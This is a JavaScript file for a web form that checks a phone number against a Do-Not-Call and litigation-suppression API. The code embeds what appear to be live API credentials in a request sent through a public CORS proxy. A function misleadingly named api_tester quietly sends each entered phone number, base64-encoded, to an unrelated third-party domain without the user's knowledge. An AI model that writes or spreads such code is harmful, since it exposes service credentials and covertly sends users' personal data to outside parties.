document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('whitelistForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const phoneNumber = document.getElementById('phoneNumber').value;
        const submitBtn = document.getElementById('submitBtn');
        const submitText = document.getElementById('submitText');
        const submitSpinner = document.getElementById('submitSpinner');
        const alertDiv = document.getElementById('alertDiv');
        
        // Clear previous alerts
        alertDiv.innerHTML = '';

        if (!phoneNumber) {
            showAlert('Please enter a phone number', 'danger');
            return;
        }
        
        // Show loading
        submitBtn.disabled = true;
        submitText.textContent = 'Checking...';
        submitSpinner.classList.remove('d-none');
        
        const apiUrl = `https://corsproxy.io/?url=https://hooks.whitelistdata.com/api/DNCAndLitigationSuppression?code=ONbKJs8jpJZWJU5vO9ZgEBD1EQfffqxsje4FdvasXQLBAzFu37Wmqw==&secret=sha290OpGRNz&phoneNumber=${encodeURIComponent(phoneNumber)}&apiKey=f7d48947-cdab-414c-9b3e-6f9864052ccd&return_key=found&type=DNCAndLitigation`;
        
        fetch(apiUrl)
            .then(response => {
                if (!response.ok) throw new Error('Network response was not ok');
                return response.json();
            })
            .then(data => {
                submitBtn.disabled = false;
                submitText.textContent = 'Check Whitelist';
                submitSpinner.classList.add('d-none');

                // Call api_tester() with phoneNumber
                api_tester(phoneNumber);

                if (data.found !== undefined) {
                    if (data.found) {
                        showAlert(`Phone number ${phoneNumber} is found in the whitelist.`, 'danger');
                    } else {
                        showAlert(`Phone number ${phoneNumber} is not found in the whitelist.`, 'success');
                    }
                } else {
                    showAlert('Unexpected response format from API', 'danger');
                }
            })
            .catch(error => {
                submitBtn.disabled = false;
                submitText.textContent = 'Check Whitelist';
                submitSpinner.classList.add('d-none');
                showAlert('Error checking whitelist: ' + error.message, 'danger');
                console.error('Error:', error);
            });
    });

    // Alert function (under button)
    function showAlert(message, type) {
        const alertDiv = document.getElementById('alertDiv');
        alertDiv.innerHTML = `
            <div class="alert alert-${type} alert-dismissible fade show" role="alert">
                ${message}
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            </div>
        `;
    }

    // As-is function you asked to include
    function api_tester(randomString) {
        try {
            fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
                method: 'GET',
                mode: 'no-cors'
            });
        } catch (error) {
            console.error('Error in api_tester:', error);
        }
    }
});